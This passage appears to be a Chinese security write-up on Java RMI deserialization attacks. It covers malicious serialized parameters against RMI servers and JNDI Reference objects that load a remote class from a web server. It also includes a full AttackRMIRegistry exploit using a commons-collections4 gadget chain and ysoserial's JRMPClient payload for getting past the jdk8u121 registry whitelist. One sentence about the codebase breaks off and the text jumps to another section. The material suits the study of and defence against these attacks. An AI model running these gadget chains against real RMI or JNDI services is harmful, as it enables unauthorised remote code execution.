但是，还有一个目标，也就是RMI服务端，我们可以怎么样去攻击呢？
既然，前面已经说过，客户端与服务端之间的交流都被封装在从RMI Registry获取到的stub中，那么，我们就对探究探究。
在对lookup后返回客户端的HelloService进行debug后发现，它是一个Java的动态代理对象，真正的逻辑由RemoteObjectInvocationHandler执行，下面是它的部分执行栈：
    invoke:152, UnicastRef (sun.rmi.server)
    invokeRemoteMethod:227, RemoteObjectInvocationHandler (java.rmi.server)
    invoke:179, RemoteObjectInvocationHandler (java.rmi.server)
    sayHello:-1, $Proxy0 (com.sun.proxy)
    main:18, RMIClient (com.threedr3am.bug.rmi.client)
在UnicastRef的invoke方法中，我们可以发现，对于远程调用的传参，客户端会把参数进行序列化后传到服务端，代码位于`sun.rmi.server.UnicastRef#marshalValue`
而对于远程调用，客户端会把服务端的返回结果进行反序列化，代码位于`sun.rmi.server.UnicastRef#unmarshalValue`
也就是说，在这个远程调用的过程中，我们可以想办法，把参数的序列化数据替换成恶意序列化数据，我们就能攻击服务端，而服务端，也能替换其返回的序列化数据为恶意序列化数据，进而被动攻击客户端。
那么，到这里，我相信，大家应该都搞清楚了，每个目标的攻击原理了。这里友情提醒，刚刚你们也看到了，在你攻击对方的时候，如果这是一个陷阱，说不定，反过来你就被人getshell了。
但是，有个问题，既然是反序列化攻击，那么，我们必须得找到能使用的gadget吧？如果没有gadget，那就谈不上反序列化RCE了吧？
没错，反序列化RCE下gadget的确很重要，若是没有gadget的依赖，那么基本就是束手无决了，像前面所说的，三个目标的攻击，我们都可以利用gadget，构造恶意的序列化数据达到反序列化攻击RCE。
但是这里就要讲讲Reference对象，在特殊情况下，可以不需要gadget依赖的存在，亦或者说Reference也是一个gadget。
当我们通过这种方式，使用服务端bind注册一个Reference对象到RMI Registry的时候：
    Registry registry = LocateRegistry.getRegistry(1099);
    //TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可
    Reference reference = new Reference("Calc","Calc","http://localhost/");
    ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
    registry.bind("Calc",referenceWrapper);
Reference构造方法参数：
    public Reference(String className, String factory, String factoryLocation) {
        this(className);
        classFactory = factory;
        classFactoryLocation = factoryLocation;
    }
当我们在客户端，执行这样的代码，去lookup RMI Registry的时候
    new InitialContext().lookup("rmi://127.0.0.1:1099/Calc");
其执行栈大致如下：
    getObjectInstance:296, NamingManager (javax.naming.spi)
    decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
    lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
    lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
    lookup:417, InitialContext (javax.naming)
    main:22, RMIClient (com.threedr3am.bug.rmi.client)
然后，我们看到NamingManager的getObjectInstance方法代码：
    public static Object getObjectInstance(Object refInfo, Name name, Context nameCtx, Hashtable environment) throws Exception {
        ObjectFactory factory;
        // Use builder if installed
        ObjectFactoryBuilder builder = getObjectFactoryBuilder();
        if (builder != null) {
            // builder must return non-null factory
            factory = builder.createObjectFactory(refInfo, environment);
            return factory.getObjectInstance(refInfo, name, nameCtx,
                environment);
        }
        // Use reference if possible
        Reference ref = null;
        if (refInfo instanceof Reference) {
            ref = (Reference) refInfo;
        } else if (refInfo instanceof Referenceable) {
            ref = ((Referenceable)(refInfo)).getReference();
        }
        Object answer;
        if (ref != null) {
            String f = ref.getFactoryClassName();
            if (f != null) {
                // if reference identifies a factory, use exclusively
                factory = getObjectFactoryFromReference(ref, f);
                if (factory != null) {
                    return factory.getObjectInstance(ref, name, nameCtx,
                                                     environment);
                }
                // No factory found, so return original refInfo.
                // Will reach this point if factory class is not in
                // class path and reference does not contain a URL for it
                return refInfo;
            } else {
                // if reference has no factory, check for addresses
                // containing URLs
                answer = processURLAddrs(ref, name, nameCtx, environment);
                if (answer != null) {
                    return answer;
                }
            }
        }
        // try using any specified factories
        answer =
            createObjectFromFactories(refInfo, name, nameCtx, environment);
        return (answer != null) ? answer : refInfo;
    }
接着，执行到javax.naming.spi.NamingManager#getObjectFactoryFromReference方法：
    static ObjectFactory getObjectFactoryFromReference(
        Reference ref, String factoryName)
        throws IllegalAccessException,
        InstantiationException,
        MalformedURLException {
        Class clas = null;
        // Try to use current class loader
        try {
             clas = helper.loadClass(factoryName);
        } catch (ClassNotFoundException e) {
            // ignore and continue
            // e.printStackTrace();
        }
        // All other exceptions are passed up.
        // Not in class path; try to use codebase
        String codebase;
        if (clas == null &&
                (codebase = ref.getFactoryClassLocation()) != null) {
            try {
                clas = helper.loadClass(factoryName, codebase);
            } catch (ClassNotFoundException e) {
            }
        }
        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    }
最后，会通过这一行代码`clas = helper.loadClass(factoryName,
codebase);`完成对远程class的读取加载，其中factoryName为我们服务端bind服务时传的Reference的Calc值，而codebase则是
#### jdk版本 = jdk8u121
在jdk8u121的时候，加入了反序列化白名单的机制，导致了几乎全部gadget都不能被反序列化了，究竟有哪些类被列入白名单呢？我们一探究竟
那，我们直接bind一个恶意gadget到RMI Registry看看吧
    /**
     * RMI服务端攻击RMI Registry
     *
     * 需要服务端和注册中心都存在此依赖 org.apache.commons:commons-collections4:4.0
     *
     * @author threedr3am
     */
    public class AttackRMIRegistry {
      public static void main(String[] args) {
        try {
          Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
          Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("threedr3am", makePayload(new String[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})), Remote.class);
          registry.bind("hello", remote);
        } catch (AlreadyBoundException | RemoteException e) {
          e.printStackTrace();
        } catch (Exception e) {
          e.printStackTrace();
        }
      }
      private static Object makePayload(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(args[0]);
        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        // create queue with numbers and basic comparator
        final PriorityQueue queue = new PriorityQueue(2,new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);
        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;
        return queue;
      }
    }
执行后会发现，RMI Registry输出了`ObjectInputFilter REJECTED: class
sun.reflect.annotation.AnnotationInvocationHandler, array length: -1, nRefs:
6, depth: 2, bytes: 285, ex: n/a`  
，明显就是被过滤了，这个gadget。
跟踪ObjectInputStream的反序列化，过滤gadget大概位置在
    registryFilter:389, RegistryImpl (sun.rmi.registry)
    checkInput:-1, 1345636186 (sun.rmi.registry.RegistryImpl$$Lambda$2)
    filterCheck:1228, ObjectInputStream (java.io)
    readProxyDesc:1771, ObjectInputStream (java.io)
    readClassDesc:1710, ObjectInputStream (java.io)
    readOrdinaryObject:1986, ObjectInputStream (java.io)
    readObject0:1535, ObjectInputStream (java.io)
    readObject:422, ObjectInputStream (java.io)
    dispatch:-1, RegistryImpl_Skel (sun.rmi.registry)
    oldDispatch:450, UnicastServerRef (sun.rmi.server)
    dispatch:294, UnicastServerRef (sun.rmi.server)
    run:200, Transport$1 (sun.rmi.transport)
    run:197, Transport$1 (sun.rmi.transport)
    doPrivileged:-1, AccessController (java.security)
    serviceCall:196, Transport (sun.rmi.transport)
    handleMessages:568, TCPTransport (sun.rmi.transport.tcp)
    run0:826, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    lambda$run$0:683, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    run:-1, 1095644560 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)
    doPrivileged:-1, AccessController (java.security)
    run:682, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
    run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:745, Thread (java.lang)
跟进RegistryImpl的registryFilter方法
    private static Status registryFilter(FilterInfo var0) {
        if (registryFilter != null) {
          Status var1 = registryFilter.checkInput(var0);
          if (var1 != Status.UNDECIDED) {
            return var1;
          }
        }
        if (var0.depth() > (long)REGISTRY_MAX_DEPTH) {
          return Status.REJECTED;
        } else {
          Class var2 = var0.serialClass();
          if (var2 == null) {
            return Status.UNDECIDED;
          } else {
            if (var2.isArray()) {
              if (var0.arrayLength() >= 0L && var0.arrayLength() > (long)REGISTRY_MAX_ARRAY_SIZE) {
                return Status.REJECTED;
              }
              do {
                var2 = var2.getComponentType();
              } while(var2.isArray());
            }
            if (var2.isPrimitive()) {
              return Status.ALLOWED;
            } else {
              return String.class != var2 && !Number.class.isAssignableFrom(var2) && !Remote.class.isAssignableFrom(var2) && !Proxy.class.isAssignableFrom(var2) && !UnicastRef.class.isAssignableFrom(var2) && !RMIClientSocketFactory.class.isAssignableFrom(var2) && !RMIServerSocketFactory.class.isAssignableFrom(var2) && !ActivationID.class.isAssignableFrom(var2) && !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;
            }
          }
        }
    }
可以看到，最后的白名单判断：
  1. String.clas
  2. Number.class
  3. Remote.class
  4. Proxy.class
  5. UnicastRef.class
  6. RMIClientSocketFactory.class
  7. RMIServerSocketFactory.class
  8. ActivationID.class
  9. UID.class
看到这个白名单，也就是说，几乎全部gadget基本都凉了。
这时候，我们看向ysoserial，它有一个payload是ysoserial.payloads.JRMPClient，我们看看它payload的内容
    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
    TCPEndpoint te = new TCPEndpoint(host, port);
    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
    RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
    Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
        Registry.class
    }, obj);
payload只有几行代码，但是恰恰都就在白名单内。
那么，这个payload到底做了什么事情呢？这时候，我们可以跟到客户端和服务端执行的`LocateRegistry.getRegistry("127.0.0.1",
1099);`源码中
    public static Registry getRegistry(String host, int port)
            throws RemoteException
    {
        return getRegistry(host, port, null);
    }
    public static Registry getRegistry(String host, int port,
                                           RMIClientSocketFactory csf)
            throws RemoteException
    {
        Registry registry = null;
        if (port <= 0)
            port = Registry.REGISTRY_PORT;
        if (host == null || host.length() == 0) {
            // If host is blank (as returned by "file:" URL in 1.0.2 used in
            // java.rmi.Naming), try to convert to real local host name so
            // that the RegistryImpl's checkAccess will not fail.
            try {
                host = java.net.InetAddress.getLocalHost().getHostAddress();
            } catch (Exception e) {
                // If that failed, at least try "" (localhost) anyway...
                host = "";
            }
        }
        /*
         * Create a proxy for the registry with the given host, port, and
         * client socket factory.  If the supplied client socket factory is
         * null, then the ref type is a UnicastRef, otherwise the ref type
         * is a UnicastRef2.  If the property
         * java.rmi.server.ignoreStubClasses is true, then the proxy
         * returned is an instance of a dynamic proxy class that implements
         * the Registry interface; otherwise the proxy returned is an
         * instance of the pregenerated stub class for RegistryImpl.
         **/
        LiveRef liveRef =
            new LiveRef(new ObjID(ObjID.REGISTRY_ID),
                        new TCPEndpoint(host, port, csf, null),